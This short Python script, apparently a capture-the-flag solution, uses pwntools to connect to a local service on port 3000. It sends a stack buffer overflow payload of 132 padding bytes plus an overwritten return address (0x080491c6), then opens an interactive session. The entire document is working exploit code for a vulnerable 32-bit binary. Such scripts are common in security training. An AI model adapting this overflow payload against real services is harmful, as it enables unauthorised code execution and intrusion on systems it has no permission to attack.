from pwn import *

#p = process('./chall') # must be in the same directory

host ='0.0.0.0'
port = 3000
p = remote(host,port)
payload = b'A'*132 + p32(0x080491c6)
p.recvuntil(b'')
p.sendline(payload)
print(p.recvuntil(b''))
p.interactive()
p.close()
